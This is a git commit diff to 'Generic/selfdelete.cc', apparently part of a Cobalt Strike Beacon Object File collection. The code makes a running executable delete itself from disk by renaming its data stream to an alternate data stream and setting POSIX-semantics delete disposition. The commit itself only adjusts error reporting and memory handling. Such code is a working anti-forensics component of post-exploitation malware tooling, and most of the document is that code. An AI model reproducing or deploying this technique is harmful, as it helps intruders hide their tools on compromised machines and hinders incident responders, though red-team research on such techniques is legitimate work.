f34e92d4e602c4864b6871eda567fc47344e3970
entropy-z <entropymalws@gmail.com>
2025-05-12 09:45:01 -0300

    improving error handling and memory management

--- Generic/selfdelete.cc
+++ Generic/selfdelete.cc
@@ -8,7 +8,7 @@
 auto SelfDelete() -> int {
     WCHAR path[MAX_PATH*2];
     if (!GetModuleFileNameW(nullptr, path, sizeof( path ) )) {
-        BeaconPrintf(CALLBACK_OUTPUT, "GetModuleFileNameW Failed: %d\n", GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "GetModuleFileNameW Failed: %d\n", GetLastError());
         return EXIT_FAILURE;
     }
 
@@ -23,23 +23,23 @@ auto SelfDelete() -> int {
         );
 
     if (h_file == INVALID_HANDLE_VALUE) {
-        BeaconPrintf(CALLBACK_OUTPUT, "CreateFileW Failed: %d\n", GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "CreateFileW Failed: %d\n", GetLastError());
         return EXIT_FAILURE;
     }
 
     const auto new_stream = L":redxvz";
     const auto size_stream = wcslen(new_stream) * sizeof(WCHAR);
     const auto size_rename = sizeof(FILE_RENAME_INFO) + size_stream;
-    const auto p_rename = static_cast<PFILE_RENAME_INFO>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size_rename));
+    const auto p_rename = static_cast<PFILE_RENAME_INFO>(Mem::Alloc(size_rename));
     if (!p_rename) {
-        BeaconPrintf(CALLBACK_OUTPUT, "HeapAlloc Failed: %d\n", GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "HeapAlloc Failed: %d\n", GetLastError());
         return EXIT_FAILURE;
     }
 
     p_rename->FileNameLength = size_stream;
     RtlCopyMemory(p_rename->FileName, new_stream, size_stream);
     if (!SetFileInformationByHandle(h_file, FileRenameInfo, p_rename, size_rename)) {
-        BeaconPrintf(CALLBACK_OUTPUT, "SetFileInformationByHandle Failed: %d\n", GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "SetFileInformationByHandle Failed: %d\n", GetLastError());
         return EXIT_FAILURE;
     }
 
@@ -57,11 +57,15 @@ auto SelfDelete() -> int {
 
     FILE_DISPOSITION_INFO_EX info = { FILE_DISPOSITION_DELETE | FILE_DISPOSITION_POSIX_SEMANTICS };
     if (!SetFileInformationByHandle(h_file, static_cast<FILE_INFO_BY_HANDLE_CLASS>(FileDispositionInfoEx), &info, sizeof(info))) {
-        BeaconPrintf(CALLBACK_OUTPUT, "SetFileInformationByHandle Failed: %d\n", GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "SetFileInformationByHandle Failed: %d\n", GetLastError());
         return EXIT_FAILURE;
     }
 
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Self file deletion succefully\n");
+
     CloseHandle(h_file);
+    if ( p_rename ) Mem::Free( p_rename );
+
     return EXIT_SUCCESS;
 }
 
